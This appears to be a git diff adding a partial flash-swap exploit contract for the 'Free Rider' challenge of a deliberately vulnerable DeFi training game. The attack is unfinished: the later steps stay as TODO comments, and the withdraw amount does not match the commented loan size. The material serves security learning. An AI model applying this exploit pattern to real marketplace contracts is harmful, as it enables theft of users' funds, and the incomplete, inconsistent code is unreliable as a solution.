@@ -89,9 +89,59 @@ contract FreeRiderNFTMarketplace is ReentrancyGuard {
     receive() external payable {}
 }
 
-contract FreeRiderAttack {
+import "../DamnValuableToken.sol";
+import "../DamnValuableNFT.sol";
+import "../free-rider/FreeRiderBuyer.sol";
+import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+
+contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
+    address immutable attacker;
+    IUniswapV2Pair immutable uniswapPair;
+    FreeRiderNFTMarketplace immutable nftMarketplace;
+    IWETH immutable weth;
+    IERC721 immutable nft;
+    address freeRiderBuyer;
+    uint256 nftPrice;
+
+    constructor(
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _nftMarketplace,
+        IWETH _weth,
+        address _freeRiderBuyer,
+        uint256 _nftPrice
+    ) {
+        attacker = msg.sender;
+        uniswapPair = _uniswapPair;
+        nftMarketplace = _nftMarketplace;
+        weth = _weth;
+        nft = _nftMarketplace.token();
+        freeRiderBuyer = _freeRiderBuyer;
+        nftPrice = _nftPrice;
+    }
+
     //TODO: 1 flashloan for 15 weth
+    function hack() external {
+        // need to pass some data to trigger uniswapV2Call
+        // borrow 15 ether of WETH
+        bytes memory data = abi.encode(uniswapPair.token0(), nftPrice);
+        uniswapPair.swap(nftPrice, 0, address(this), data);
+    }
+
     // 2. uniswap weth to eth
+    function uniswapV2Call(
+        address,
+        uint,
+        uint,
+        bytes calldata
+    ) external override {
+        weth.withdraw(120 ether);
+    }
     // 3. buy all the NFT
     // 4. send to FreeRiderBuyer contract
     // 5. repay loan to uniswap
